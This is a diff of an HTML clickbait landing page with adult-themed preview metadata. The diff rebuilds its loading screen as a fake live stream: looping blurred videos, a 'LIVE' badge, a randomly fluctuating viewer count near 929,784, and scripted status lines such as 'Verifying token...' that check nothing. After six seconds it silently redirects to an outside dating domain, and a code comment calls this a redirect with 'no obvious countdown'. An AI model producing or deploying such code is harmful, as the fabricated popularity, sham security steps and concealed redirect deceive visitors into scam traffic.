@@ -8,10 +8,11 @@
 <meta property="og:type" content="website">
 <meta property="og:title" content="💋 LIVE ON A PRIVATE SITE 🔥 FREE AND FUN 👀 JOIN NOW">
 <meta property="og:description" content="929.784 Online Members">
-<meta property="og:image" content="https://res.cloudinary.com/daxme62nv/image/upload/v1781177404/niydnjz0bjbwg0lu0j7j.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Candra2222/img/refs/heads/main/blur-camera-blur-1779801404259.jpg">
 <meta property="og:image:width" content="1080">
 <meta property="og:image:height" content="1080">
 <meta name="robots" content="index, follow">
+
 <!-- STYLE ANIMASI -->
 <style>
 * {
@@ -22,10 +23,10 @@
 
 html, body {
   height: 100%;
-  background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #334155 100%);
   color: #fff;
   font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
   overflow: hidden;
+  background: #0f0f0f;
 }
 
 .wrap {
@@ -37,22 +38,57 @@ html, body {
   position: relative;
 }
 
+/* Video Background */
+.video-bg {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 0;
+  overflow: hidden;
+}
+
+.video-bg video {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  min-width: 100%;
+  min-height: 100%;
+  width: auto;
+  height: auto;
+  transform: translate(-50%, -50%);
+  object-fit: cover;
+  filter: blur(8px) brightness(0.4);
+}
+
+.video-overlay {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: radial-gradient(circle at center, rgba(20,20,20,0.6) 0%, rgba(0,0,0,0.9) 100%);
+  z-index: 1;
+}
+
 /* Background animated particles */
 .particles {
   position: absolute;
   width: 100%;
   height: 100%;
   overflow: hidden;
-  z-index: 0;
+  z-index: 1;
+  pointer-events: none;
 }
 
 .particle {
   position: absolute;
-  width: 4px;
-  height: 4px;
-  background: rgba(255, 255, 255, 0.3);
+  width: 3px;
+  height: 3px;
+  background: rgba(255, 255, 255, 0.15);
   border-radius: 50%;
-  animation: float 15s infinite;
+  animation: float 20s infinite;
 }
 
 @keyframes float {
@@ -60,12 +96,8 @@ html, body {
     transform: translateY(100vh) rotate(0deg);
     opacity: 0;
   }
-  10% {
-    opacity: 1;
-  }
-  90% {
-    opacity: 1;
-  }
+  10% { opacity: 0.5; }
+  90% { opacity: 0.5; }
   100% {
     transform: translateY(-100vh) rotate(720deg);
     opacity: 0;
@@ -74,55 +106,81 @@ html, body {
 
 /* Main content */
 .content {
-  z-index: 1;
+  z-index: 2;
   text-align: center;
+  padding: 20px;
+  width: 100%;
+  max-width: 420px;
+}
+
+/* Live Badge */
+.live-badge-container {
+  margin-bottom: 20px;
+  opacity: 0;
+  animation: fade-in 0.8s ease forwards 0.2s;
+}
+
+.live-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  padding: 8px 20px;
+  background: rgba(255, 0, 0, 0.15);
+  border: 1px solid rgba(255, 0, 0, 0.3);
+  border-radius: 50px;
+  font-size: 13px;
+  font-weight: 700;
+  letter-spacing: 1px;
+  color: #ff4444;
+  text-transform: uppercase;
+}
+
+.live-dot {
+  width: 8px;
+  height: 8px;
+  background: #ff4444;
+  border-radius: 50%;
+  animation: blink 1.5s infinite;
+  box-shadow: 0 0 10px #ff4444;
+}
+
+@keyframes blink {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.3; }
 }
 
 /* Modern spinner */
 .loader-container {
   position: relative;
-  width: 120px;
-  height: 120px;
-  margin-bottom: 30px;
+  width: 80px;
+  height: 80px;
+  margin: 0 auto 25px auto;
+  opacity: 0;
+  animation: fade-in 0.8s ease forwards 0.4s;
 }
 
 .loader {
   position: absolute;
   width: 100%;
   height: 100%;
-  border: 4px solid transparent;
-  border-top-color: #3b82f6;
-  border-right-color: #8b5cf6;
+  border: 3px solid transparent;
+  border-top-color: rgba(255, 255, 255, 0.3);
+  border-right-color: rgba(255, 255, 255, 0.1);
   border-radius: 50%;
-  animation: spin 1s linear infinite;
+  animation: spin 1.2s linear infinite;
 }
 
 .loader-inner {
   position: absolute;
-  top: 15px;
-  left: 15px;
-  right: 15px;
-  bottom: 15px;
-  border: 4px solid transparent;
-  border-top-color: #ec4899;
-  border-left-color: #f59e0b;
+  top: 12px;
+  left: 12px;
+  right: 12px;
+  bottom: 12px;
+  border: 3px solid transparent;
+  border-top-color: rgba(255, 255, 255, 0.6);
+  border-left-color: rgba(255, 255, 255, 0.2);
   border-radius: 50%;
-  animation: spin-reverse 1.5s linear infinite;
-}
-
-.loader-core {
-  position: absolute;
-  top: 35px;
-  left: 35px;
-  right: 35px;
-  bottom: 35px;
-  background: linear-gradient(135deg, #3b82f6, #ec4899);
-  border-radius: 50%;
-  animation: pulse 2s ease-in-out infinite;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 24px;
+  animation: spin-reverse 1.8s linear infinite;
 }
 
 @keyframes spin {
@@ -133,188 +191,372 @@ html, body {
   to { transform: rotate(-360deg); }
 }
 
-@keyframes pulse {
-  0%, 100% { transform: scale(1); opacity: 0.8; }
-  50% { transform: scale(1.1); opacity: 1; }
-}
-
 /* Loading text */
 .text {
-  font-size: 28px;
-  font-weight: 700;
-  margin-bottom: 10px;
-  background: linear-gradient(90deg, #3b82f6, #ec4899, #f59e0b);
-  background-size: 200% auto;
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  background-clip: text;
-  animation: gradient-shift 3s ease infinite;
-}
-
-@keyframes gradient-shift {
-  0% { background-position: 0% center; }
-  50% { background-position: 100% center; }
-  100% { background-position: 0% center; }
+  font-size: 22px;
+  font-weight: 600;
+  margin-bottom: 8px;
+  color: rgba(255, 255, 255, 0.9);
+  opacity: 0;
+  animation: fade-in 0.8s ease forwards 0.6s;
 }
 
 .subtext {
-  font-size: 14px;
-  color: rgba(255, 255, 255, 0.6);
-  margin-bottom: 25px;
+  font-size: 13px;
+  color: rgba(255, 255, 255, 0.4);
+  margin-bottom: 30px;
+  opacity: 0;
+  animation: fade-in 0.8s ease forwards 0.8s;
 }
 
 /* Progress bar */
 .progress-container {
-  width: 280px;
-  height: 6px;
-  background: rgba(255, 255, 255, 0.1);
+  width: 200px;
+  height: 3px;
+  background: rgba(255, 255, 255, 0.08);
   border-radius: 10px;
   overflow: hidden;
-  margin-bottom: 15px;
+  margin: 0 auto 20px auto;
+  opacity: 0;
+  animation: fade-in 0.8s ease forwards 1s;
 }
 
 .progress-bar {
   height: 100%;
-  background: linear-gradient(90deg, #3b82f6, #ec4899, #f59e0b);
+  background: linear-gradient(90deg, #ff4444, #ff6b6b);
   border-radius: 10px;
   width: 0%;
-  animation: loading 3s ease-in-out forwards;
-  box-shadow: 0 0 20px rgba(59, 130, 246, 0.5);
+  animation: loading 4s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+  box-shadow: 0 0 15px rgba(255, 68, 68, 0.4);
 }
 
 @keyframes loading {
   0% { width: 0%; }
+  50% { width: 70%; }
+  80% { width: 90%; }
   100% { width: 100%; }
 }
 
-/* Percentage counter */
-.percentage {
-  font-size: 16px;
-  font-weight: 600;
-  color: #3b82f6;
+/* Status text */
+.status-text {
+  font-size: 12px;
+  color: rgba(255, 255, 255, 0.35);
   font-variant-numeric: tabular-nums;
+  letter-spacing: 0.5px;
+  opacity: 0;
+  animation: fade-in 0.8s ease forwards 1.2s;
+  min-height: 18px;
 }
 
-/* Redirect message */
-.redirect-msg {
-  margin-top: 20px;
-  padding: 12px 24px;
-  background: rgba(255, 255, 255, 0.05);
+/* Video preview card - STREAM STYLE */
+.video-preview {
+  margin-top: 25px;
+  width: 100%;
+  border-radius: 12px;
+  overflow: hidden;
+  border: 1px solid rgba(255, 255, 255, 0.08);
+  background: rgba(0, 0, 0, 0.5);
+  position: relative;
+  opacity: 0;
+  transform: translateY(10px);
+  animation: preview-in 0.6s ease forwards 0.5s;
+}
+
+.video-preview video {
+  width: 100%;
+  height: 200px;
+  object-fit: cover;
+  display: block;
+  opacity: 0.7;
+}
+
+/* Stream overlay on video */
+.stream-overlay {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+  padding: 12px;
+  background: linear-gradient(to bottom, rgba(0,0,0,0.4) 0%, transparent 30%, transparent 60%, rgba(0,0,0,0.6) 100%);
+  pointer-events: none;
+}
+
+.stream-top-bar {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.stream-viewers {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 12px;
+  font-weight: 600;
+  color: #fff;
+  background: rgba(0,0,0,0.5);
+  padding: 4px 10px;
+  border-radius: 20px;
+  backdrop-filter: blur(4px);
+}
+
+.viewer-dot {
+  width: 6px;
+  height: 6px;
+  background: #4ade80;
+  border-radius: 50%;
+  animation: pulse-dot 2s infinite;
+}
+
+@keyframes pulse-dot {
+  0%, 100% { opacity: 1; transform: scale(1); }
+  50% { opacity: 0.6; transform: scale(0.8); }
+}
+
+.stream-quality {
+  font-size: 10px;
+  font-weight: 700;
+  color: #fff;
+  background: rgba(255, 0, 0, 0.8);
+  padding: 3px 8px;
+  border-radius: 4px;
+  letter-spacing: 0.5px;
+}
+
+.stream-bottom-bar {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.stream-avatar {
+  width: 32px;
+  height: 32px;
+  border-radius: 50%;
+  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 14px;
+  border: 2px solid rgba(255,255,255,0.2);
+}
+
+.stream-info {
+  text-align: left;
+}
+
+.stream-username {
+  font-size: 13px;
+  font-weight: 600;
+  color: #fff;
+}
+
+.stream-title {
+  font-size: 11px;
+  color: rgba(255,255,255,0.6);
+}
+
+/* Connecting toast */
+.connecting-toast {
+  position: fixed;
+  bottom: 30px;
+  left: 50%;
+  transform: translateX(-50%) translateY(20px);
+  background: rgba(20, 20, 20, 0.95);
   border: 1px solid rgba(255, 255, 255, 0.1);
+  padding: 12px 24px;
   border-radius: 50px;
   font-size: 13px;
   color: rgba(255, 255, 255, 0.7);
-  backdrop-filter: blur(10px);
+  display: flex;
+  align-items: center;
+  gap: 10px;
   opacity: 0;
-  transform: translateY(10px);
-  animation: fade-in-up 0.5s ease forwards 2s;
+  animation: toast-in 0.5s ease forwards 2s;
+  z-index: 10;
+  backdrop-filter: blur(10px);
 }
 
-@keyframes fade-in-up {
+.toast-spinner {
+  width: 14px;
+  height: 14px;
+  border: 2px solid rgba(255,255,255,0.1);
+  border-top-color: #4ade80;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+
+@keyframes toast-in {
+  to {
+    opacity: 1;
+    transform: translateX(-50%) translateY(0);
+  }
+}
+
+@keyframes fade-in {
+  to { opacity: 1; }
+}
+
+@keyframes preview-in {
   to {
     opacity: 1;
     transform: translateY(0);
   }
 }
 
-.redirect-msg span {
-  color: #3b82f6;
-  font-weight: 600;
-}
-
 /* Responsive */
 @media (max-width: 480px) {
-  .loader-container {
-    width: 100px;
-    height: 100px;
+  .content {
+    padding: 16px;
   }
   
-  .loader-core {
-    top: 28px;
-    left: 28px;
-    right: 28px;
-    bottom: 28px;
+  .loader-container {
+    width: 70px;
+    height: 70px;
+  }
+
+  .text {
     font-size: 20px;
   }
-  
-  .text {
-    font-size: 24px;
+
+  .video-preview video {
+    height: 170px;
   }
   
-  .progress-container {
-    width: 240px;
+  .connecting-toast {
+    font-size: 12px;
+    padding: 10px 18px;
   }
 }
 </style>
 
+<base target="_blank">
 </head>
 <body>
   <div class="wrap">
+    <!-- Video Background -->
+    <div class="video-bg">
+      <video autoplay muted loop playsinline poster="https://res.cloudinary.com/daxme62nv/video/upload/v1781997496/Visit_onlyshare.io_for_MORE_12408_online-video-cutter.com_cez235.mp4">
+        <source src="https://res.cloudinary.com/daxme62nv/video/upload/v1781997496/Visit_onlyshare.io_for_MORE_12408_online-video-cutter.com_cez235.mp4" type="video/mp4">
+      </video>
+      <div class="video-overlay"></div>
+    </div>
+
     <!-- Background particles -->
     <div class="particles" id="particles"></div>
-    
+
     <div class="content">
+      <!-- Live Badge -->
+      <div class="live-badge-container">
+        <div class="live-badge">
+          <span class="live-dot"></span>
+          LIVE
+        </div>
+      </div>
+
       <div class="loader-container">
         <div class="loader"></div>
         <div class="loader-inner"></div>
-        <div class="loader-core">🔴</div>
       </div>
-      
-      <div class="text">Wait a minute!</div>
-      <div class="subtext">Preparing your exclusive content</div>
-      
+
+      <div class="text" id="statusTitle">Connecting to stream...</div>
+      <div class="subtext">Establishing secure connection</div>
+
       <div class="progress-container">
         <div class="progress-bar"></div>
       </div>
-      
-      <div class="percentage" id="percentage">0%</div>
-      
-      <div class="redirect-msg">
-        Redirecting to <span>secure server</span> in <span id="countdown">3</span>s
+
+      <div class="status-text" id="statusText">Initializing...</div>
+
+      <!-- Video Preview Card - Real Stream Look -->
+      <div class="video-preview">
+        <video autoplay muted loop playsinline poster="https://res.cloudinary.com/daxme62nv/video/upload/v1781996596/Visit_onlyshare.io_for_MORE_12481_online-video-cutter.com_q8yfnt.mp4">
+          <source src="https://res.cloudinary.com/daxme62nv/video/upload/v1781996596/Visit_onlyshare.io_for_MORE_12481_online-video-cutter.com_q8yfnt.mp4" type="video/mp4">
+        </video>
+        
+        <div class="stream-overlay">
+          <div class="stream-top-bar">
+            <div class="stream-viewers">
+              <span class="viewer-dot"></span>
+              <span id="viewerCount">929,784</span>
+            </div>
+            <div class="stream-quality">HD</div>
+          </div>
+          
+          <div class="stream-bottom-bar">
+            <div class="stream-avatar">👤</div>
+            <div class="stream-info">
+              <div class="stream-username">Private Room 🔒</div>
+              <div class="stream-title">Exclusive Content</div>
+            </div>
+          </div>
+        </div>
       </div>
+    </div>
+    
+    <!-- Subtle connecting toast -->
+    <div class="connecting-toast" id="connectToast">
+      <div class="toast-spinner"></div>
+      <span>Joining broadcast...</span>
     </div>
   </div>
 
 <script>
 // Create floating particles
 const particlesContainer = document.getElementById('particles');
-for (let i = 0; i < 50; i++) {
+for (let i = 0; i < 30; i++) {
   const particle = document.createElement('div');
   particle.className = 'particle';
   particle.style.left = Math.random() * 100 + '%';
-  particle.style.animationDelay = Math.random() * 15 + 's';
-  particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
+  particle.style.animationDelay = Math.random() * 20 + 's';
+  particle.style.animationDuration = (Math.random() * 15 + 15) + 's';
   particlesContainer.appendChild(particle);
 }
 
-// Animate percentage counter
-let percentage = 0;
-const percentageEl = document.getElementById('percentage');
-const interval = setInterval(() => {
-  percentage += Math.floor(Math.random() * 3) + 1;
-  if (percentage >= 100) {
-    percentage = 100;
-    clearInterval(interval);
-  }
-  percentageEl.textContent = percentage + '%';
-}, 50);
+// Dynamic status text simulation
+const statusTexts = [
+  "Initializing...",
+  "Resolving host...",
+  "Handshaking...",
+  "Verifying token...",
+  "Buffering stream...",
+  "Optimizing quality...",
+  "Almost ready..."
+];
+let statusIndex = 0;
+const statusEl = document.getElementById('statusText');
+const statusTitle = document.getElementById('statusTitle');
 
-// Countdown timer
-let countdown = 3;
-const countdownEl = document.getElementById('countdown');
-const countdownInterval = setInterval(() => {
-  countdown--;
-  if (countdown <= 0) {
-    clearInterval(countdownInterval);
-  } else {
-    countdownEl.textContent = countdown;
+const statusInterval = setInterval(() => {
+  statusIndex++;
+  if (statusIndex < statusTexts.length) {
+    statusEl.textContent = statusTexts[statusIndex];
   }
-}, 1000);
+  if (statusIndex === 3) {
+    statusTitle.textContent = "Securing connection...";
+  }
+  if (statusIndex === 5) {
+    statusTitle.textContent = "Preparing broadcast...";
+  }
+}, 600);
 
-// Delay redirect
+// Simulate fluctuating viewer count
+const viewerEl = document.getElementById('viewerCount');
+let baseViewers = 929784;
+setInterval(() => {
+  const change = Math.floor(Math.random() * 50) - 25;
+  baseViewers += change;
+  viewerEl.textContent = baseViewers.toLocaleString();
+}, 2000);
+
+// Smooth redirect (no obvious countdown)
 setTimeout(function () {
-  window.location.href = "https://megan.invdvvip.site/mQ38xaoZTeeDgP3Su8zhCwNWJLqf5vzt";
-}, 3000); // 3 detik untuk animasi lebih smooth
+  window.location.replace("https://cozzydate.my.id/cYmJU7qWBdvtnaVGPBVkBA6AETtwcEJk");
+}, 6000);
 </script>
 
     <!-- Histats.com  START  (aync)-->
@@ -332,3 +574,4 @@ hs.src = ('//s10.histats.com/js15_as.js');
 
 </body>
 </html>
+
